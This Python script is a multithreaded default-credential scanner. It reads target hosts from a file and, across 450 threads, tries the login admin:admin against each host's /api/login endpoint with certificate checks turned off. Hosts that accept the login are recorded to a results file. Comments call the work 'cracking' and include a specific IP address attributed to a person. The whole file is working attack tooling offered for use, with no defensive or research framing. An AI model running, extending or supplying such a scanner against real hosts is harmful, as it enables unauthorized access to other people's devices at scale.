#!/usr/bin/python
# -*- coding: utf-8 -*-

import json
import threading
from queue import Queue
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

ips = open('ips.txt', 'r').readlines()  # file to crack format https:1.2.3.4:5001/api/login

thr = 450  # speed of cracking
results = open('results.txt', 'a')


# https://122.199.17.31:5001 ---from Aboudi

def login(url):
    url = '{}/api/login'.format(url)
    data = {'Username': 'admin', 'Password': 'admin'}

    # Convert from Python to JSON format:
    json_data = json.dumps(data)

    # convert str to bytes (ensure encoding is OK)
    post_data = json_data.encode('utf-8')

    # we should also say the JSON content type header

    headers = {}
    headers['Content-Type'] = 'application/json'

    try:
        session = requests.session()
        r = session.post(url, data=post_data, verify=False,
                         headers=headers, timeout=6)
        if 'AuthSuccess' in r.text:
            print('[+]Logged IP {} admin:admin'.format(url))
            print(results.write('{} admin:admin\n'.format(url)))
            print(results.flush())
        else:
            print('[-] NOT LOGGED {}'.format(url))

    except Exception as e:
        return False


def worker():
    while True:
        (ip, max) = q.get()
        login(ip)
        q.task_done()


# Create the queue and thread pool.

q = Queue()
for i in range(thr):
    t = threading.Thread(target=worker)
    t.daemon = True  # thread dies when main thread (only non-daemon thread) exits.
    t.start()

# stuff work items on the queue (in this case, just a url).

for ip in ips:
    q.put(ip)

q.join()

